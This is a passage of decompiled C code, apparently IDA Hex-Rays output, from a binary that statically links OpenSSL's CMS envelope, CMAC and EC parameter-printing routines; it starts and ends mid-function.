  if ( a3 )
    *a3 = 0;
  result = *(_DWORD *)v7;
  if ( !*(_DWORD *)v7 )
  {
    if ( a5 )
      *a5 = **(_DWORD **)(v7 + 4);
    if ( a6 )
    {
      *a6 = *(_DWORD *)(*(_DWORD *)(v7 + 4) + 4);
      return 1;
    }
    return 1;
  }
  if ( result == 1 )
  {
    if ( a4 )
    {
      *a4 = *(_DWORD *)(v7 + 4);
      return result;
    }
    return 1;
  }
  if ( result == 2 )
  {
    if ( a2 )
      *a2 = **(_DWORD **)(v7 + 4);
    if ( a3 )
      *a3 = *(_DWORD *)(*(_DWORD *)(v7 + 4) + 4);
    return 1;
  }
  return 0;
}

//----- (00478250) --------------------------------------------------------
int __cdecl sub_478250(_DWORD *a1)
{
  if ( *a1 == 1 )
    return *(_DWORD *)(a1[1] + 24);
  else
    return 0;
}

//----- (00478270) --------------------------------------------------------
int __usercall sub_478270@<eax>(int a1@<ecx>, char *a2@<ebx>, int a3@<esi>, char **a4, int a5, int a6)
{
  int v6; // ebp
  char *v7; // edi
  int result; // eax
  size_t v9; // edx
  size_t *v10; // eax
  int v11; // [esp-4h] [ebp-60h]
  size_t Size; // [esp+8h] [ebp-54h] BYREF
  unsigned int v13; // [esp+Ch] [ebp-50h] BYREF
  char **v14; // [esp+10h] [ebp-4Ch]
  size_t *v15; // [esp+14h] [ebp-48h]
  _BYTE v16[64]; // [esp+18h] [ebp-44h] BYREF

  v11 = *(_DWORD *)(a3 + 24);
  v14 = a4;
  v15 = (size_t *)a1;
  v6 = 0;
  v7 = 0;
  v13 = sub_407470(v11);
  if ( v13 > 0x40 )
    return 0;
  if ( sub_453F90(*(int **)(a3 + 20), (int)v16, &v13) > 0 )
  {
    if ( sub_406270(*(int ***)(a3 + 24), 0, 0, (int)v16, 0, a6) )
    {
      if ( sub_406560(*(_DWORD **)(a3 + 24), 0, (int *)&Size, a2, a5) )
      {
        v7 = (char *)sub_4133F0(Size);
        if ( v7 )
        {
          if ( sub_406560(*(_DWORD **)(a3 + 24), v7, (int *)&Size, a2, a5) )
          {
            v9 = Size;
            v10 = v15;
            *v14 = v7;
            *v10 = v9;
            v6 = 1;
          }
        }
      }
    }
  }
  sub_4139E0(v16, v13);
  if ( !v6 )
    sub_413490(v7);
  sub_405920(*(void **)(a3 + 24));
  sub_443A10(*(volatile LONG ***)(a3 + 20));
  result = v6;
  *(_DWORD *)(a3 + 20) = 0;
  return result;
}
// 478270: using guessed type _BYTE var_44[64];

//----- (004783C0) --------------------------------------------------------
int __usercall sub_4783C0@<eax>(unsigned int *a1@<ebx>, int a2)
{
  int **v2; // esi
  int v3; // edi
  FILE *v4; // eax
  int *v6; // eax
  int *v7; // eax
  int *v8; // eax
  int v9; // [esp+0h] [ebp-Ch]

  v2 = *(int ***)(a2 + 24);
  v3 = sub_432B60(v9);
  if ( sub_435D30((int)v2) )
  {
    v4 = (FILE *)sub_435D30((int)v2);
    return (_fileno(v4) & 0xF0007) == 65538;
  }
  else if ( sub_4076A0(a1) == 44 )
  {
    v6 = (int *)sub_45FA90();
    return sub_4065A0(v2, v6, 0, 0, 0);
  }
  else if ( v3 > 16 )
  {
    if ( v3 > 24 )
      v8 = (int *)sub_404750();
    else
      v8 = (int *)sub_404740();
    return sub_4065A0(v2, v8, 0, 0, 0);
  }
  else
  {
    v7 = (int *)sub_404730();
    return sub_4065A0(v2, v7, 0, 0, 0);
  }
}
// 4783CA: variable 'v9' is possibly undefined

//----- (004785D0) --------------------------------------------------------
int __cdecl sub_4785D0(_DWORD *a1, int a2)
{
  int v2; // eax
  int v3; // ecx
  int v4; // ecx
  int (__cdecl *v5)(int, int, int, _DWORD *); // ecx
  int v6; // eax

  if ( *a1 )
  {
    if ( *a1 != 1 )
      return 0;
    v3 = a1[1];
    if ( !*(_DWORD *)(v3 + 20) )
      return 0;
    v2 = sub_432B60(*(_DWORD *)(v3 + 20));
    if ( !v2 )
      return 0;
  }
  else
  {
    v2 = *(_DWORD *)(a1[1] + 20);
  }
  v4 = *(_DWORD *)(v2 + 12);
  if ( !v4 )
    return 1;
  v5 = *(int (__cdecl **)(int, int, int, _DWORD *))(v4 + 92);
  if ( !v5 )
    return 1;
  v6 = v5(v2, 7, a2, a1);
  if ( v6 == -2 )
  {
    sub_408310(46, 171, 125, (int)"crypto\\cms\\cms_env.c", 71);
    return 0;
  }
  if ( v6 > 0 )
    return 1;
  sub_408310(46, 171, 111, (int)"crypto\\cms\\cms_env.c", 75);
  return 0;
}

//----- (00478670) --------------------------------------------------------
int __cdecl sub_478670(_DWORD *a1)
{
  if ( !*a1 )
    return *(_DWORD *)(a1[1] + 24);
  if ( *a1 == 1 )
    return *(_DWORD *)(a1[1] + 20);
  return 0;
}

//----- (00478690) --------------------------------------------------------
int __cdecl sub_478690(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  _DWORD *v5; // eax

  if ( *a1 )
  {
    sub_408310(46, 142, 124, (int)"crypto\\cms\\cms_env.c", 238);
    return 0;
  }
  else
  {
    v5 = (_DWORD *)a1[1];
    if ( a2 )
      *a2 = v5[5];
    if ( a3 )
      *a3 = v5[4];
    if ( a4 )
      *a4 = v5[2];
    return 1;
  }
}

//----- (00478880) --------------------------------------------------------
int __usercall sub_478880@<eax>(int a1@<edx>, int a2)
{
  int *v2; // ebx
  int v3; // eax
  void *v4; // esi
  int v5; // ebp
  int v6; // edi
  _DWORD *v8; // eax
  int v9; // eax
  _BYTE v10[244]; // [esp+10h] [ebp-F4h] BYREF

  v2 = *(int **)(a1 + 4);
  v3 = v2[4];
  v4 = 0;
  v5 = 0;
  v6 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12);
  if ( !v3 )
  {
    sub_408310(46, 136, 130, (int)"crypto\\cms\\cms_env.c", 627);
    return 0;
  }
  if ( sub_4117D0(v3, 8 * v2[5], v10) )
  {
    sub_408310(46, 136, 115, (int)"crypto\\cms\\cms_env.c", 633);
  }
  else
  {
    v8 = sub_4133F0(*(_DWORD *)(v6 + 20) + 8);
    v4 = v8;
    if ( v8 )
    {
      v9 = sub_4CE720((int)v10, 0, v8, *(void **)(v6 + 16), *(_DWORD *)(v6 + 20));
      if ( v9 > 0 )
      {
        sub_4329C0(v2[3], (int)v4, v9);
        v5 = 1;
        goto LABEL_6;
      }
      sub_408310(46, 136, 159, (int)"crypto\\cms\\cms_env.c", 647);
    }
    else
    {
      sub_408310(46, 136, 65, (int)"crypto\\cms\\cms_env.c", 640);
    }
  }
  sub_413490(v4);
LABEL_6:
  sub_4139E0(v10, 0xF4u);
  return v5;
}
// 4117D0: using guessed type int __cdecl sub_4117D0(_DWORD, _DWORD, _DWORD);
// 478880: using guessed type _BYTE var_F4[244];

//----- (004789B0) --------------------------------------------------------
int __cdecl sub_4789B0(int a1, _DWORD *Size)
{
  void *v2; // esp
  _DWORD *v3; // esi
  int *v4; // ebp
  _DWORD *v5; // edi
  void *v6; // eax
  int v7; // eax
  int v8; // edi
  int v9; // ebp
  void *v10; // esp
  int v11; // ebp
  void *v12; // ebx
  int *v13; // edi
  int *v14; // esi
  int result; // eax
  int v16; // [esp+0h] [ebp-Ch]
  int v17; // [esp+4h] [ebp-8h]
  int v18; // [esp+4h] [ebp-8h]
  char *v19; // [esp+8h] [ebp-4h] BYREF

  switch ( *Size )
  {
    case 0:
      v10 = alloca(8);
      v11 = (int)Size;
      v12 = 0;
      v18 = 0;
      if ( *Size )
      {
        sub_408310(46, 141, 124, (int)"crypto\\cms\\cms_env.c", 303);
        return 0;
      }
      v13 = (int *)Size[1];
      v14 = (int *)v13[6];
      v19 = *(char **)(*(_DWORD *)(a1 + 4) + 12);
      if ( v14 )
      {
        if ( !sub_4785D0(Size, 0) )
          goto LABEL_33;
        goto LABEL_26;
      }
      result = (int)sub_443D20(v13[5], 0);
      v14 = (int *)result;
      if ( !result )
        return result;
      if ( sub_453CD0((int *)result) > 0 )
      {
LABEL_26:
        if ( sub_443A60((int)v14, -1, 256, 9, 0, v11) > 0 )
        {
          if ( sub_453D40(v14, 0, (unsigned int *)&Size, *((_DWORD *)v19 + 4), *((_DWORD *)v19 + 5)) > 0 )
          {
            v12 = sub_4133F0((size_t)Size);
            if ( v12 )
            {
              if ( sub_453D40(v14, (int)v12, (unsigned int *)&Size, *((_DWORD *)v19 + 4), *((_DWORD *)v19 + 5)) > 0 )
              {
                sub_4329C0(v13[3], (int)v12, (int)Size);
                v12 = 0;
                v18 = 1;
              }
            }
            else
            {
              sub_408310(46, 141, 65, (int)"crypto\\cms\\cms_env.c", 335);
            }
          }
        }
        else
        {
          sub_408310(46, 141, 110, (int)"crypto\\cms\\cms_env.c", 325);
        }
      }
LABEL_33:
      sub_443A10((volatile LONG **)v14);
      v13[6] = 0;
      sub_413490(v12);
      return v18;
    case 1:
      v2 = alloca(12);
      if ( *Size != 1 )
      {
        sub_408310(46, 178, 181, (int)"crypto\\cms\\cms_kari.c", 373);
        return 0;
      }
      v3 = (_DWORD *)Size[1];
      v4 = (int *)v3[4];
      v17 = (int)v4;
      v16 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 12);
      result = sub_4783C0(*(unsigned int **)(v16 + 12), (int)v3);
      if ( !result )
        return result;
      v5 = (_DWORD *)v3[1];
      if ( *v5 == -1 )
      {
        *v5 = 2;
        v6 = sub_479850();
        v7 = sub_42FB20((int)v6);
        v5[1] = v7;
        if ( !v7 )
          return 0;
      }
      if ( !sub_4785D0(Size, 0) )
        return 0;
      v8 = 0;
      if ( sub_426A30((int)v4) <= 0 )
        return 1;
      while ( 1 )
      {
        v9 = sub_426A40(v4, v8);
        if ( sub_453E20(v3[5], *(_DWORD **)(v9 + 8)) <= 0
          || !sub_478270((int)&Size, *(char **)(v16 + 16), (int)v3, &v19, *(_DWORD *)(v16 + 20), 1) )
        {
          break;
        }
        sub_4329C0(*(_DWORD *)(v9 + 4), (int)v19, (int)Size);
        if ( ++v8 >= sub_426A30(v17) )
          return 1;
        v4 = (int *)v17;
      }
      return 0;
    case 2:
      return sub_478880((int)Size, a1);
    case 3:
      return sub_4CE990(a1, (int)Size, 1);
    default:
      sub_408310(46, 169, 154, (int)"crypto\\cms\\cms_env.c", 774);
      return 0;
  }
}

//----- (00478A30) --------------------------------------------------------
void __usercall sub_478A30(int *a1@<ebx>)
{
  int v1; // esi
  int v2; // edi
  int v3; // eax
  int v4; // edi

  v1 = a1[1];
  if ( v1 )
  {
    v2 = 0;
    if ( sub_426A30(*(_DWORD *)v1) <= 0 )
    {
LABEL_8:
      v4 = 0;
      if ( sub_426A30(*(_DWORD *)(v1 + 4)) <= 0 )
        return;
      while ( *(_DWORD *)sub_426A40(*(int **)(v1 + 4), v4) != 1 )
      {
        if ( ++v4 >= sub_426A30(*(_DWORD *)(v1 + 4)) )
          return;
      }
    }
    else
    {
      while ( 1 )
      {
        v3 = *(_DWORD *)sub_426A40(*(int **)v1, v2);
        if ( v3 == 4 )
          break;
        if ( v3 == 3 && *a1 < 3 )
          *a1 = 3;
        if ( ++v2 >= sub_426A30(*(_DWORD *)v1) )
          goto LABEL_8;
      }
    }
    *a1 = 4;
  }
}

//----- (00478AC0) --------------------------------------------------------
void __thiscall sub_478AC0(int this)
{
  int v2; // esi
  int v3; // eax
  int v4; // ecx

  if ( *(int *)this < 4 )
  {
    sub_478A30((int *)this);
    if ( *(int *)this < 3 )
    {
      v2 = 0;
      if ( sub_426A30(*(_DWORD *)(this + 8)) <= 0 )
      {
LABEL_10:
        if ( *(_DWORD *)(this + 4) || *(_DWORD *)(this + 16) )
        {
          *(_DWORD *)this = 2;
        }
        else if ( *(_DWORD *)this != 2 )
        {
          *(_DWORD *)this = 0;
        }
      }
      else
      {
        while ( 1 )
        {
          v3 = sub_426A40(*(int **)(this + 8), v2);
          v4 = *(_DWORD *)v3;
          if ( *(_DWORD *)v3 == 3 || v4 == 4 )
            break;
          if ( v4 || **(_DWORD **)(v3 + 4) )
            *(_DWORD *)this = 2;
          if ( ++v2 >= sub_426A30(*(_DWORD *)(this + 8)) )
            goto LABEL_10;
        }
        *(_DWORD *)this = 3;
      }
    }
  }
}

//----- (00478B60) --------------------------------------------------------
volatile LONG *__cdecl sub_478B60(_DWORD *Block)
{
  _DWORD *v2; // ebx
  int v3; // esi
  volatile LONG *result; // eax
  int *v5; // edi
  _DWORD *v6; // eax
  int v7; // esi
  _BYTE *v8; // [esp-14h] [ebp-24h]
  int v9; // [esp-10h] [ebp-20h]
  volatile LONG *Blocka; // [esp+14h] [ebp+4h]

  v2 = *(_DWORD **)(Block[1] + 12);
  v3 = 0;
  result = (volatile LONG *)sub_4CE340(v2);
  Blocka = result;
  if ( result && v2[3] )
  {
    v5 = *(int **)(Block[1] + 8);
    if ( sub_426A30((int)v5) <= 0 )
    {
LABEL_6:
      sub_478AC0(Block[1]);
      v7 = 1;
    }
    else
    {
      while ( 1 )
      {
        v6 = (_DWORD *)sub_426A40(v5, v3);
        if ( sub_4789B0((int)Block, v6) <= 0 )
          break;
        if ( ++v3 >= sub_426A30((int)v5) )
          goto LABEL_6;
      }
      sub_408310(46, 125, 116, (int)"crypto\\cms\\cms_env.c", 868);
      v7 = 0;
    }
    v9 = v2[5];
    v8 = (_BYTE *)v2[4];
    v2[3] = 0;
    sub_4134B0(v8, v9);
    v2[4] = 0;
    v2[5] = 0;
    if ( v7 )
    {
      return Blocka;
    }
    else
    {
      sub_404F50(Blocka);
      return 0;
    }
  }
  return result;
}

//----- (00478C50) --------------------------------------------------------
int __usercall sub_478C50@<eax>(char *a1@<edi>, int a2, int a3)
{
  char v3; // cl
  char v4; // dl
  int result; // eax
  char v6; // dl
  char v7; // [esp+Fh] [ebp-1h]

  v3 = *a1;
  v4 = (unsigned __int8)*a1 >> 7;
  result = 0;
  v7 = v4;
  if ( a3 - 1 > 0 )
  {
    do
    {
      v6 = (2 * v3) | ((unsigned __int8)a1[result + 1] >> 7);
      v3 = a1[result + 1];
      *(_BYTE *)(result + a2) = v6;
      ++result;
    }
    while ( result < a3 - 1 );
    v4 = v7;
  }
  *(_BYTE *)(result + a2) = (2 * v3) ^ -v4 & (a3 != 16 ? 27 : -121);
  return result;
}

//----- (00478CC0) --------------------------------------------------------
_DWORD *sub_478CC0()
{
  _DWORD *v0; // esi
  void *v1; // eax

  v0 = sub_4133F0(0x88u);
  if ( !v0 )
    return 0;
  v1 = sub_405990();
  *v0 = v1;
  if ( !v1 )
  {
    sub_413490(v0);
    return 0;
  }
  v0[33] = -1;
  return v0;
}

//----- (00478D10) --------------------------------------------------------
int __cdecl sub_478D10(int a1)
{
  int result; // eax

  sub_4059B0(*(void **)a1);
  sub_4139E0((_BYTE *)(a1 + 68), 0x20u);
  sub_4139E0((_BYTE *)(a1 + 4), 0x20u);
  sub_4139E0((_BYTE *)(a1 + 36), 0x20u);
  result = sub_4139E0((_BYTE *)(a1 + 100), 0x20u);
  *(_DWORD *)(a1 + 132) = -1;
  return result;
}

//----- (00478D60) --------------------------------------------------------
void __cdecl sub_478D60(void *Block)
{
  if ( Block )
  {
    sub_478D10((int)Block);
    sub_413490(Block);
  }
}

//----- (00478D90) --------------------------------------------------------
int __cdecl sub_478D90(int a1, int *a2)
{
  int result; // eax
  int v3; // ebx

  if ( a2[33] == -1 )
    return 0;
  result = sub_406160(*(void **)a1, *a2);
  if ( result )
  {
    v3 = sub_4073D0(*a2);
    memcpy((void *)(a1 + 4), a2 + 1, v3);
    memcpy((void *)(a1 + 36), a2 + 9, v3);
    memcpy((void *)(a1 + 68), a2 + 17, v3);
    memcpy((void *)(a1 + 100), a2 + 25, v3);
    *(_DWORD *)(a1 + 132) = a2[33];
    return 1;
  }
  return result;
}

//----- (00478E20) --------------------------------------------------------
int __cdecl sub_478E20(char *a1, int a2, int a3, int *a4, int *a5)
{
  int v6; // eax
  int v7; // ebx

  if ( a2 )
  {
    if ( !a4 )
    {
LABEL_11:
      if ( a2 )
      {
        if ( !sub_435D30(*(_DWORD *)a1) )
          return 0;
        if ( !sub_406600(*(_DWORD **)a1, a3) )
          return 0;
        if ( !sub_4065A0(*(int ***)a1, 0, 0, a2, &unk_521754) )
          return 0;
        v7 = sub_4073D0(*(_DWORD *)a1);
        if ( !sub_4073E0(*(_DWORD *)a1) )
          return 0;
        sub_478C50(a1 + 68, (int)(a1 + 4), v7);
        sub_478C50(a1 + 4, (int)(a1 + 36), v7);
        sub_4139E0(a1 + 68, v7);
        if ( !sub_4065A0(*(int ***)a1, 0, 0, 0, &unk_521754) )
          return 0;
        memset(a1 + 68, 0, v7);
        *((_DWORD *)a1 + 33) = 0;
      }
      return 1;
    }
LABEL_10:
    if ( !sub_4065A0(*(int ***)a1, a4, a5, 0, 0) )
      return 0;
    goto LABEL_11;
  }
  if ( a4 )
    goto LABEL_10;
  if ( !a5 && !a3 )
  {
    if ( *((_DWORD *)a1 + 33) != -1 && sub_4065A0(*(int ***)a1, 0, 0, 0, &unk_521754) )
    {
      v6 = sub_4073D0(*(_DWORD *)a1);
      memset(a1 + 68, 0, v6);
      *((_DWORD *)a1 + 33) = 0;
      return 1;
    }
    return 0;
  }
  return 1;
}

//----- (00478F90) --------------------------------------------------------
int __cdecl sub_478F90(int *a1, char *Src, size_t Size)
{
  char *v3; // edi
  size_t v5; // ebp
  unsigned int v6; // ebx
  int v7; // eax
  size_t v8; // edi

  v3 = Src;
  if ( a1[33] == -1 )
    return 0;
  v5 = Size;
  if ( !Size )
    return 1;
  v6 = sub_4073D0(*a1);
  v7 = a1[33];
  if ( v7 <= 0 )
    goto LABEL_10;
  v8 = v6 - v7;
  if ( Size < v6 - v7 )
    v8 = Size;
  memcpy((char *)a1 + v7 + 100, Src, v8);
  a1[33] += v8;
  v5 = Size - v8;
  if ( Size == v8 )
    return 1;
  v3 = &Src[v8];
  if ( sub_4073E0(*a1) )
  {
LABEL_10:
    if ( v5 > v6 )
    {
      while ( sub_4073E0(*a1) )
      {
        v5 -= v6;
        v3 += v6;
        if ( v5 <= v6 )
          goto LABEL_13;
      }
      return 0;
    }
LABEL_13:
    memcpy(a1 + 25, v3, v5);
    a1[33] = v5;
    return 1;
  }
  return 0;
}

//----- (00479070) --------------------------------------------------------
int __cdecl sub_479070(int *a1, _BYTE *a2, int *a3)
{
  int v4; // esi
  int v5; // eax
  _BYTE *v6; // ecx
  _BYTE *v7; // eax
  int v8; // ebp
  char v9; // dl
  _BYTE *v10; // ecx
  _BYTE *v11; // eax
  int v12; // ebp
  char v13; // dl

  if ( a1[33] == -1 )
    return 0;
  v4 = sub_4073D0(*a1);
  *a3 = v4;
  if ( !a2 )
    return 1;
  v5 = a1[33];
  if ( v5 == v4 )
  {
    if ( v4 > 0 )
    {
      v6 = a2;
      v7 = a1 + 1;
      v8 = v4;
      do
      {
        v9 = *v7 ^ v7[96];
        ++v7;
        *v6++ = v9;
        --v8;
      }
      while ( v8 );
    }
  }
  else
  {
    *((_BYTE *)a1 + v5 + 100) = 0x80;
    if ( v4 - v5 > 1 )
      memset((char *)a1 + v5 + 101, 0, v4 - v5 - 1);
    if ( v4 > 0 )
    {
      v10 = a2;
      v11 = a1 + 9;
      v12 = v4;
      do
      {
        v13 = *v11 ^ v11[64];
        ++v11;
        *v10++ = v13;
        --v12;
      }
      while ( v12 );
    }
  }
  if ( sub_4073E0(*a1) )
    return 1;
  sub_4139E0(a2, v4);
  return 0;
}

//----- (00479140) --------------------------------------------------------
BOOL __usercall sub_479140@<eax>(const char *a1@<ecx>, int a2@<ebx>, int a3@<edi>, unsigned int a4, signed int Size)
{
  size_t v5; // ebp
  unsigned int v8; // esi
  const char *v9; // ecx
  char v10[128]; // [esp+Ch] [ebp-84h] BYREF

  v5 = Size;
  if ( !a2 )
    return 1;
  if ( Size <= 0 )
  {
    v5 = 0;
  }
  else
  {
    if ( Size > 128 )
      v5 = 128;
    memset(v10, 32, v5);
    if ( sub_405110(a3, (int)v10, v5) <= 0 )
      return 0;
  }
  if ( sub_419190(a3, "%s", a1) <= 0 )
    return 0;
  v8 = 0;
  if ( a4 )
  {
    while ( 1 )
    {
      if ( !(v8 % 0xF) )
      {
        v10[0] = 10;
        memset(&v10[1], 32, v5 + 4);
        if ( sub_405110(a3, (int)v10, v5 + 5) <= 0 )
          break;
      }
      v9 = byte_4F1291;
      if ( v8 + 1 != a4 )
        v9 = word_4F1980;
      if ( sub_419190(a3, "%02x%s", *(unsigned __int8 *)(a2 + v8), v9) <= 0 )
        break;
      if ( ++v8 >= a4 )
        return sub_405110(a3, (int)"\n", 1) > 0;
    }
    return 0;
  }
  return sub_405110(a3, (int)"\n", 1) > 0;
}

//----- (004792C0) --------------------------------------------------------
int __cdecl sub_4792C0(int a1, FILE *Stream, int Size)
{
  int *v3; // ebx
  int v4; // eax
  int v5; // esi
  char *v6; // eax
  char *v7; // esi
  int v8; // eax
  _DWORD *v9; // edi
  int v10; // ebp
  char *v11; // eax
  int v12; // esi
  char *v13; // eax
  int v14; // eax
  int v15; // eax
  __int16 v17; // [esp+10h] [ebp-30h]
  void **v18; // [esp+14h] [ebp-2Ch]
  void **v19; // [esp+18h] [ebp-28h]
  void **v20; // [esp+1Ch] [ebp-24h]
  void **Block; // [esp+20h] [ebp-20h]
  void **v22; // [esp+24h] [ebp-1Ch]
  unsigned int v23; // [esp+28h] [ebp-18h]
  int v24; // [esp+2Ch] [ebp-14h]
  int v25; // [esp+30h] [ebp-10h]
  _DWORD *v26; // [esp+34h] [ebp-Ch]
  _DWORD *v27; // [esp+38h] [ebp-8h]
  int v28; // [esp+3Ch] [ebp-4h]

  v24 = 0;
  v17 = 32;
  v22 = 0;
  Block = 0;
  v18 = 0;
  v19 = 0;
  v20 = 0;
  v23 = 0;
  if ( Stream )
  {
    v3 = sub_420670();
    v22 = (void **)v3;
    if ( !v3 )
      goto LABEL_48;
    if ( sub_457690((int)Stream) )
    {
      if ( !sub_405340(a1, Size, 128) )
        goto LABEL_49;
      v4 = _fileno(Stream);
      v5 = v4;
      if ( !v4 )
        goto LABEL_49;
      v6 = sub_4233A0(v4);
      if ( sub_419190(a1, "ASN1 OID: %s", v6) <= 0 || sub_419190(a1, "\n") <= 0 )
        goto LABEL_49;
      v7 = sub_437640(v5);
      if ( v7 )
      {
        if ( sub_405340(a1, Size, 128) && sub_419190(a1, "NIST CURVE: %s\n", v7) > 0 )
        {
          v24 = 1;
          goto LABEL_50;
        }
LABEL_49:
        sub_408310(16, 149, v17, (int)"crypto\\ec\\eck_prn.c", 228);
        goto LABEL_50;
      }
LABEL_47:
      v24 = 1;
      goto LABEL_50;
    }
    v8 = sub_435D30((int)Stream);
    v25 = sub_422350(v8);
    Block = (void **)sub_4168C0();
    if ( !Block || (v18 = (void **)sub_4168C0()) == 0 || (v19 = (void **)sub_4168C0()) == 0 )
    {
LABEL_48:
      v17 = 65;
      goto LABEL_49;
    }
    if ( v25 == 407 )
    {
      if ( !sub_435F10((int)Stream) )
        goto LABEL_18;
    }
    else if ( !sub_435E90((int)Stream) )
    {
      goto LABEL_18;
    }
    v9 = (_DWORD *)sub_422350((int)Stream);
    if ( v9 )
    {
      v26 = (_DWORD *)sub_432B60((int)Stream);
      v27 = (_DWORD *)sub_407400((int)Stream);
      if ( v26 )
      {
        v10 = sub_435DD0((int)Stream);
        v20 = (void **)sub_4CECC0((int)Stream, v9, v10, 0, v3);
        if ( v20 )
        {
          v28 = sub_432E70((int)Stream);
          if ( v28 )
            v23 = sub_404FF0((int)Stream);
          if ( !sub_405340(a1, Size, 128) )
            goto LABEL_49;
          v11 = sub_4233A0(v25);
          if ( sub_419190(a1, "Field Type: %s\n", v11) <= 0 )
            goto LABEL_49;
          if ( v25 == 407 )
          {
            v12 = sub_41E880((int)Stream);
            if ( !v12 )
              goto LABEL_49;
            if ( !sub_405340(a1, Size, 128) )
              goto LABEL_49;
            v13 = sub_4233A0(v12);
            if ( sub_419190(a1, "Basis Type: %s\n", v13) <= 0 )
              goto LABEL_49;
            v14 = sub_477F80(a1, "Polynomial:", Block, 0, Size);
          }
          else
          {
            v14 = sub_477F80(a1, "Prime:", Block, 0, Size);
          }
          if ( !v14 || !sub_477F80(a1, "A:   ", v18, 0, Size) || !sub_477F80(a1, "B:   ", v19, 0, Size) )
            goto LABEL_49;
          if ( v10 == 2 )
            v15 = sub_477F80(a1, off_5353E8[0], v20, 0, Size);
          else
            v15 = v10 == 4
                ? sub_477F80(a1, off_5353EC[0], v20, 0, Size)
                : sub_477F80(a1, (const char *)off_5353F0, v20, 0, Size);
          if ( !v15
            || !sub_477F80(a1, "Order: ", v26, 0, Size)
            || v27 && !sub_477F80(a1, "Cofactor: ", v27, 0, Size)
            || v28 && !sub_479140("Seed:", v28, a1, v23, Size) )
          {
            goto LABEL_49;
          }
          goto LABEL_47;
        }
      }
    }
LABEL_18:
    sub_408310(16, 149, 16, (int)"crypto\\ec\\eck_prn.c", 228);
    goto LABEL_50;
  }
  sub_408310(16, 149, 67, (int)"crypto\\ec\\eck_prn.c", 228);
LABEL_50:
  sub_417060(Block);
  sub_417060(v18);
  sub_417060(v19);
  sub_417060(v20);
  sub_4206C0(v22);
  return v24;
}
// 5353E8: using guessed type char *off_5353E8[4];
// 5353EC: using guessed type char *off_5353EC[3];

//----- (004796F0) --------------------------------------------------------
void *sub_4796F0()
{
  return &unk_522008;
}

//----- (00479700) --------------------------------------------------------
void *sub_479700()
{
  return &unk_52204C;
}

//----- (00479710) --------------------------------------------------------
void *sub_479710()
{
  return &unk_5220CC;
}

//----- (00479720) --------------------------------------------------------
void *sub_479720()
{
  return &unk_522110;
}

//----- (00479730) --------------------------------------------------------
void *sub_479730()
{
  return &unk_522154;
}

//----- (00479740) --------------------------------------------------------
int __cdecl sub_479740(int a1, int *a2)
{
  int v2; // esi

  if ( a1 == 3 )
  {
    v2 = *a2;
    sub_41CEB0(*(volatile LONG **)(*a2 + 32));
    sub_433520(*(_DWORD *)(v2 + 28));
    sub_42B840(*(_BYTE **)(v2 + 36));
  }
  return 1;
}

//----- (00479780) --------------------------------------------------------
void *sub_479780()
{
  return &unk_522214;
}

//----- (00479790) --------------------------------------------------------
void *sub_479790()
{
  return &unk_522258;
}

//----- (004797A0) --------------------------------------------------------
void *sub_4797A0()
{
  return &unk_52229C;
}

//----- (004797B0) --------------------------------------------------------
void *sub_4797B0()
{
  return &unk_522330;
}

//----- (004797C0) --------------------------------------------------------
void *sub_4797C0()
{
  return &unk_522374;
}

//----- (004797D0) --------------------------------------------------------
void *sub_4797D0()
{
  return &unk_5223CC;
}

//----- (004797E0) --------------------------------------------------------
void *sub_4797E0()
{
  return &unk_522438;
}

//----- (004797F0) --------------------------------------------------------
void *sub_4797F0()
{
  return &unk_52247C;
}

//----- (00479800) --------------------------------------------------------
void *sub_479800()
{
  return &unk_5224D4;
}

//----- (00479810) --------------------------------------------------------
void *sub_479810()
{
  return &unk_522518;
}

//----- (00479820) --------------------------------------------------------
int __cdecl sub_479820(int a1, int a2)
{
  if ( a1 == 3 )
    sub_41CEB0(*(volatile LONG **)(*(_DWORD *)a2 + 8));
  return 1;
}

//----- (00479840) --------------------------------------------------------
void *sub_479840()
{
  return &unk_522574;
}

//----- (00479850) --------------------------------------------------------
void *sub_479850()
{
  return &unk_5225B8;
}

//----- (00479860) --------------------------------------------------------
void *sub_479860()
{
  return &unk_522610;
}

//----- (00479870) --------------------------------------------------------
int __cdecl sub_479870(int a1, int *a2)
{
  int v2; // esi
  int result; // eax

  v2 = *a2;
  if ( a1 == 1 )
  {
    result = (int)sub_405990();
    *(_DWORD *)(v2 + 24) = result;
    if ( result )
    {
      sub_4075C0(result, 1);
      *(_DWORD *)(v2 + 20) = 0;
      return 1;
    }
  }
  else
  {
    if ( a1 == 3 )
    {
      sub_443A10(*(volatile LONG ***)(v2 + 20));
      sub_4059B0(*(void **)(v2 + 24));
    }
    return 1;
  }
  return result;
}

//----- (004798D0) --------------------------------------------------------
void *sub_4798D0()
{
  return &unk_522644;
}

//----- (004798E0) --------------------------------------------------------
void *sub_4798E0()
{
  return &unk_522700;
}

//----- (004798F0) --------------------------------------------------------
void *sub_4798F0()
{
  return &unk_52271C;
}

//----- (00479900) --------------------------------------------------------
void *sub_479900()
{
  return &unk_5227D8;
}

//----- (00479910) --------------------------------------------------------
void *sub_479910()
{
  return &unk_52281C;
}

//----- (00479920) --------------------------------------------------------
int __cdecl sub_479920(int a1, int **a2)
{
  int *v2; // eax
  int v3; // ecx
  int v4; // esi

  if ( a1 == 2 )
  {
    v2 = *a2;
    v3 = **a2;
    if ( !v3 )
    {
      v4 = v2[1];
      sub_41CEB0(*(volatile LONG **)(v4 + 20));
      sub_433520(*(_DWORD *)(v4 + 16));
      sub_443A10(*(volatile LONG ***)(v4 + 24));
      return 1;
    }
    if ( v3 == 2 || v3 == 3 )
      sub_4134B0(*(_BYTE **)(v2[1] + 16), *(_DWORD *)(v2[1] + 20));
  }
  return 1;
}

//----- (00479990) --------------------------------------------------------
void *sub_479990()
{
  return &unk_5228B4;
}

//----- (004799A0) --------------------------------------------------------
void *sub_4799A0()
{
  return &unk_522934;
}

//----- (004799B0) --------------------------------------------------------
void *sub_4799B0()
{
  return &unk_5229A0;
}

//----- (004799C0) --------------------------------------------------------
void *sub_4799C0()
{
  return &unk_5229F8;
}

//----- (004799D0) --------------------------------------------------------
void *sub_4799D0()
{
  return &unk_522A14;
}

//----- (004799E0) --------------------------------------------------------
void *sub_4799E0()
{
  return &unk_522B20;
}

//----- (004799F0) --------------------------------------------------------
void *sub_4799F0()
{
  return &unk_522BF8;
}

//----- (00479A00) --------------------------------------------------------
int __cdecl sub_479A00(int a1, int **a2, int a3, int a4)
{
  int *v4; // edi
  int *v5; // eax
  int result; // eax

  if ( !a2 )
    return 1;
